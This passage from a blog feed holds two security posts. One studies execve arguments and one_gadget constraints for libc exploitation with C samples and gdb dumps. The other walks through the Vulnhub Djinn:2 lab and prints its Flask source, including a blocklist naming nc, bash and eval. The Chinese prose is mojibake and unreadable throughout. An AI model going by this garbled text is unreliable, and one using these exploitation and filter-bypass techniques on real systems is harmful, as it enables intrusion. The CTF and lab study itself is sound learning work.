        <content type="html"><![CDATA[<p>one_gadgetçš„æ¡ä»¶å¹¶æ²¡æœ‰é‚£ä¹ˆè‹›åˆ»ï¼Œæœ‰å¾ˆå¤§çš„å®½é™ä½™åœ°</p><p>æ„Ÿè°¢ <a href="https://blog.csdn.net/weixin_44864859">æ£‚æ˜Ÿ</a> å¸ˆå‚…å‘ç°é—®é¢˜ï¼Œæ„Ÿè°¢<a href="http://taqini.space/2020/04/29/about-execve/">TaQiniå¸ˆå‚…åšå®¢å‚è€ƒèµ„æ–™</a></p><a id="more"></a><h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>Linuxä¸‹execveå‡½æ•°çš„æè¿°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], </span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>; </span><br></pre></td></tr></table></figure><ul><li><p>  argvæ˜¯è¦è°ƒç”¨çš„ç¨‹åºæ‰§è¡Œçš„å‚æ•°åºåˆ—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è°ƒç”¨çš„ç¨‹åºéœ€è¦ä¼ å…¥çš„å‚æ•°ã€‚</p></li><li><p>  envp åŒæ ·ä¹Ÿæ˜¯å‚æ•°åºåˆ—ï¼Œä¸€èˆ¬æ¥è¯´ä»–æ˜¯ä¸€ç§é”®å€¼å¯¹çš„å½¢å¼ key=value. ä½œä¸ºæˆ‘ä»¬æ˜¯æ–°ç¨‹åºçš„ç¯å¢ƒã€‚</p></li></ul><h2 id="ç¤ºä¾‹ç¨‹åº"><a href="#ç¤ºä¾‹ç¨‹åº" class="headerlink" title="ç¤ºä¾‹ç¨‹åº"></a>ç¤ºä¾‹ç¨‹åº</h2><h3 id="é›¶ä¸ªå‚æ•°"><a href="#é›¶ä¸ªå‚æ•°" class="headerlink" title="é›¶ä¸ªå‚æ•°"></a>é›¶ä¸ªå‚æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¾ç„¶å¯ä»¥ã€‚</p><h3 id="ä¸€ä¸ªå‚æ•°"><a href="#ä¸€ä¸ªå‚æ•°" class="headerlink" title="ä¸€ä¸ªå‚æ•°"></a>ä¸€ä¸ªå‚æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="one_gadget/image-20200720225143097.png" alt="image-20200720225143097"></p><p>å¾—åˆ°äº†ä¸€ä¸ªshellï¼Œè§‚å¯Ÿæ­¤æ—¶çš„<code>argv[]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x555555554701 (&lt;main+87&gt;:call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555555546f7 &lt;main+77&gt;:mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x5555555546fb &lt;main+81&gt;:mov    rsi,rcx</span><br><span class="line">   0x5555555546fe &lt;main+84&gt;:mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x555555554701 &lt;main+87&gt;:call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:mov    eax,0x0</span><br><span class="line">   0x55555555470b &lt;main+97&gt;:mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555470f &lt;main+101&gt;:xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554718 &lt;main+110&gt;:je     0x55555555471f &lt;main+117&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x219a7d923809200 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x00005555555547018    execve(filename, argv, envp);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°<code>rsi(0x7fffffffdf40)</code>å¤„çš„å€¼ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;) ; &lt;-- åˆæ³•æŒ‡é’ˆ</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 ; &lt;-- NULL(åˆæ³•æŒ‡é’ˆ) </span><br></pre></td></tr></table></figure><h3 id="ä¸¤ä¸ªå‚æ•°"><a href="#ä¸¤ä¸ªå‚æ•°" class="headerlink" title="ä¸¤ä¸ªå‚æ•°"></a>ä¸¤ä¸ªå‚æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="string">&quot;1.sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>1.sh</code>æ˜¯æˆ‘è‡ªå·±åˆ›å»ºçš„ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ cat 1.sh </span><br><span class="line">echo hello</span><br></pre></td></tr></table></figure><p>ç¨‹åºçš„è¿è¡Œç»“æœå¦‚ä¸‹</p><p><img src="one_gadget/image-20200720224735113.png" alt="image-20200720224735113"></p><p>æˆåŠŸè¿è¡Œäº†<code>1.sh</code>ä½†æ˜¯å¹¶æ²¡æœ‰è¿”å›ä¸€ä¸ªshellï¼Œè§‚å¯Ÿæ­¤æ—¶<code>argv[]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x55555555470c (&lt;main+98&gt;:call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554702 &lt;main+88&gt;:mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:mov    rsi,rcx</span><br><span class="line">   0x555555554709 &lt;main+95&gt;:mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x55555555470c &lt;main+98&gt;:call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554711 &lt;main+103&gt;:mov    eax,0x0</span><br><span class="line">   0x555555554716 &lt;main+108&gt;:mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555471a &lt;main+112&gt;:xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554723 &lt;main+121&gt;:je     0x55555555472a &lt;main+128&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x6276ca1997ede900 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055555555470c8    execve(filename, argv, envp);</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°<code>rsi(0x7fffffffdf40)</code>å¤„çš„å€¼ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)  ; &lt;-- åˆæ³•æŒ‡é’ˆ</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 ; &lt;-- åˆæ³•æŒ‡é’ˆ</span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 ; &lt;-- NULL(åˆæ³•æŒ‡é’ˆ)</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶ä¸èƒ½getshell</p><h2 id="one-gadgeté™åˆ¶"><a href="#one-gadgeté™åˆ¶" class="headerlink" title="one_gadgeté™åˆ¶"></a>one_gadgeté™åˆ¶</h2><p>ä½¿ç”¨<code>one_gadget</code>éƒ½æœ‰é™åˆ¶æ¡ä»¶ï¼Œä¾‹å¦‚<code>libc-2.27.so</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ one_gadget ../libc-2.27.so </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…¶å®è§„åˆ™åº”è¯¥å˜æˆ</p><ol><li> <code>[rsp+0x30(ä¸¾ä¾‹)] == NULL</code> </li><li> <code>[rsp+0x30] == (pointer)</code> &amp;&amp; <code>[rsp+0x38] == NULL</code></li></ol><h2 id="å®é™…åº”ç”¨"><a href="#å®é™…åº”ç”¨" class="headerlink" title="å®é™…åº”ç”¨"></a>å®é™…åº”ç”¨</h2><p>å¸ˆå‚…ç»™çš„é¢˜æ˜¯<code>vn_2020_simpleHeap</code></p><p>expæœ€å<code>realloc</code>è°ƒæ•´æ ˆçš„æ—¶å€™è°ƒåˆ°<code>+0xC</code>çš„åœ°æ–¹ï¼Œå‘ç°ä¸æ»¡è¶³æ¡ä»¶</p><img src="one_gadget/image-20200720230640839.png" alt="image-20200720230640839" style="zoom:50%;" /><p>å¾—åˆ°äº†shellï¼š</p><img src="one_gadget/image-20200720230708171.png" alt="image-20200720230708171" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub Djinn:2é¶æœº</title>
      <link href="/Djinn-2.html"/>
      <url>/Djinn-2.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ Djinn:2 é¶æœº</p><p>ä¸­ç­‰éš¾åº¦</p><a id="more"></a><h1 id="Djinn-2"><a href="#Djinn-2" class="headerlink" title="Djinn:2"></a>Djinn:2</h1><img src="Djinn:2/image-20200720161617553.png" alt="image-20200720161617553" style="zoom:50%;" /><p>å¼€å¯äº†<code>21 22 1337 5000 7331</code>ç«¯å£</p><p>å…¶ä¸­<code>1337ç«¯å£</code> ä¹Ÿæ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œè¿™å›æ²¡æœ‰å»ç©ï¼ˆä¹‹åå¯ä»¥è¯•è¯•ï¼‰</p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>è€ä¸‰æ ·</p><img src="Djinn:2/image-20200720164826449.png" alt="image-20200720164826449" style="zoom:50%;" /><p>è¿™ç©æ„å¾ˆåƒæ˜¯å¯†ç ï¼Ÿä½†æ˜¯sshä¸å¯¹ï¼ˆåœ¨åé¢ç”¨åˆ°äº†ï¼‰</p><h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>7331ç«¯å£è®¿é—®ä¹‹åè¿˜æ˜¯è€æ ·å­</p><img src="Djinn:2/image-20200720162014809.png" alt="image-20200720162014809" style="zoom:50%;" /><p><code>/wish</code>å·²ç»ä¿®å¤</p><img src="Djinn:2/image-20200720162039152.png" alt="image-20200720162039152" style="zoom:33%;" /><p><code>robots.txt</code>é‡Œé¢åªå†™äº†ä¸€ä¸ª<code>/letshack</code>ï¼ˆå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼‰</p><p>ç›®å½•æ‰«æè¿˜æœ‰ä¸€ä¸ª<code>/source</code></p><p>ä¸‹è½½ä¸‹æ¥ä¹‹åæ˜¯ä¸€ä¸ªpythonæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line">        requests.post(url)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>é‚£ä¼°è®¡è€ƒç‚¹å°±æ˜¯5000ç«¯å£äº†</p><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>åˆ†æsourceæ–‡ä»¶å¯çŸ¥ 5000ç«¯å£ç”¨çš„æ˜¯postæ–¹æ³•ï¼Œå°è¯•æŠ“ä¸ªåŒ…</p><img src="Djinn:2/image-20200720163202232.png" alt="image-20200720163202232" style="zoom:50%;" /><p>åœ¨<code>username</code>å˜é‡å­˜åœ¨<code>RCE</code></p><img src="Djinn:2/image-20200720163255638.png" alt="image-20200720163255638" style="zoom:50%;" /><p><strong>app.py</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;|&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;eval&quot;</span>,  <span class="string">&quot;python&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span 